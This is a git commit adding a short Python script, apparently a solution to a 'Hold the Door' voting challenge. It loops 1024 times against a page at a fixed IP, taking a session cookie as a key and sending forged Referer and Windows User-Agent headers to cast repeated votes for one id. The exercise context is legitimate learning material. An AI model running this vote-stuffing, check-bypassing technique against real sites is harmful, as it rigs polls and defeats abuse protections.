4506a03cdb1cff6b51f3b8c1f9f34ad446ebcd81
julianfrancor <julianfrancor@gmail.com>
2020-06-02 04:47:31 +0000

    program that votes 1024 times for your id passing a Http Header modified for windows

---
+++ level_2/level_2.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+
+import requests
+
+"""Python send POST with header"""
+
+host = "http://158.69.76.135/level2.php"
+
+for i in range(1024):
+    response = requests.get('http://158.69.76.135/level2.php')
+    header = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "http://158.69.76.135/level2.php",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0WOW64 rv: 44.0) Gecko/20100101 Firefox/44.0",
+    }
+    payload = {'id': '1528', 'holdthedoor': 'submit',
+               'key': response.cookies['HoldTheDoor']}
+    cookies = {'HoldTheDoor': response.cookies['HoldTheDoor']}
+    req = requests.post(host, payload, headers=header, cookies=cookies)
+
